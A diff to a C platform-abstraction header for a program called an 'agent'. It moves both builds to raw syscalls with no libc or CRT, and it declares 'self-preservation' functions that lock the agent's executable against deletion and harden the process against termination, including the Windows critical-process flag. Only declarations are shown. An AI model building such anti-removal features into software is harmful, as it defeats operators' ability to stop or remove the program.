@@ -2,20 +2,20 @@
  * pal.h - Platform Abstraction Layer Interface
  * ==========================================================================
  * The PAL isolates every OS-specific operation behind a portable C99 API.
- * Two implementations exist:
- *   - pal_linux.c : POSIX (Linux, macOS)
- *   - pal_win32.c : Win32 / Winsock2
+ * Two implementations exist, both using pure syscalls (no libc/CRT):
+ *   - pal_linux.c : Raw x86_64 SYSCALL instruction via syscall_linux.h
+ *   - pal_win32.c : ntdll.dll native API via syscall_win32.h (AFD for sockets)
  *
- * Only one PAL source is compiled per build (selected by CMakeLists.txt).
+ * Only one PAL source is compiled per build (selected by the Makefile).
  *
  * Design decisions:
- *   - Socket handles are abstracted as plain `int`.  On Windows, SOCKET is
- *     typedef'd to UINT_PTR which fits in int for typical usage.  We cast
- *     carefully inside pal_win32.c.
+ *   - Socket handles are abstracted as plain `int`.  On Windows, the AFD
+ *     handle fits in int for typical usage.  We cast carefully inside
+ *     pal_win32.c.
  *   - All functions return 0 on success, -1 on failure (unless documented
  *     otherwise).
  *   - Buffers are caller-allocated unless documented otherwise (e.g.,
- *     pal_read_file allocates via malloc).
+ *     pal_read_file allocates via mmap/VirtualMemory).
  * ========================================================================== */
 #ifndef PAL_H
 #define PAL_H
@@ -157,5 +157,35 @@ void pal_log(const char *fmt, ...);
  * Returns 1 if the file exists (kill switch triggered), 0 otherwise.
  */
 int pal_check_sentinel(const char *path);
+
+/* ---- Self-preservation ------------------------------------------------ */
+
+/**
+ * Enable self-preservation: protect the agent's own executable from
+ * deletion/rename/overwrite and harden the running process against
+ * termination.
+ *
+ * Linux:   Raw syscall()-based flock + prctl(PR_SET_DUMPABLE, 0).
+ * Windows: NtOpenFile (deny delete/write sharing) +
+ *          NtSetInformationProcess (ProcessBreakOnTermination).
+ *
+ * Returns 0 on success, -1 on failure (partial success may still
+ * apply — e.g., file locked but process flag failed).
+ */
+int pal_self_preserve_start(void);
+
+/**
+ * Disable self-preservation: release file locks/handles and remove
+ * the critical-process flag.
+ * Returns 0 on success, -1 on failure.
+ */
+int pal_self_preserve_stop(void);
+
+/**
+ * Write the full filesystem path of the running agent binary into
+ * `buf` (up to `size - 1` chars, NUL-terminated).
+ * Returns 0 on success, -1 on failure.
+ */
+int pal_get_exe_path(char *buf, size_t size);
 
 #endif /* PAL_H */
